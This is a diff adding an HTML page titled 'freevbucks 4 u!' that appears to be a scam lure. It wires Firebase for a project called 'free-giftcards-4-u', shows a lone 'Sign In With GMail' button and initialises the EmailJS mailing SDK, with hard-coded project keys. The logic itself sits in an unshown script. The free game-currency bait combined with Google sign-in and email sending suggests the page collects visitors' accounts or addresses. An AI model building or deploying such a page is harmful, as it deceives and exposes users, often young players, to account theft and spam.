@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>freevbucks 4 u!</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://www.gstatic.com/firebasejs/5.8.2/firebase.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.5/firebase.js"></script>
+    <script>
+      // Initialize Firebase
+      var config = {
+        apiKey: "AIzaSyAOktUahouG8q7kDxSr8HmssD1cXuhgMqo",
+        authDomain: "free-giftcards-4-u.firebaseapp.com",
+        databaseURL: "https://free-giftcards-4-u.firebaseio.com",
+        projectId: "free-giftcards-4-u",
+        storageBucket: "free-giftcards-4-u.appspot.com",
+        messagingSenderId: "713025208049"
+      };
+      firebase.initializeApp(config);
+    </script>
+
+    <!-- import the webpage's stylesheet -->
+    <link rel="stylesheet" href="/style.css">
+
+    <!-- import the webpage's javascript file -->
+
+  <script
+  src="https://code.jquery.com/jquery-3.3.1.js"
+  integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
+  crossorigin="anonymous"></script>
+    <script src="/script.js" defer></script>
+  </head>
+  <body>
+    <button id = "signIn">
+    Sign In With GMail
+    </button>
+  </body>
+  <script type="text/javascript" src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("user_cQyfuShMaB1hwt3oy3h3V");
+   })();
+</script>
+</html>
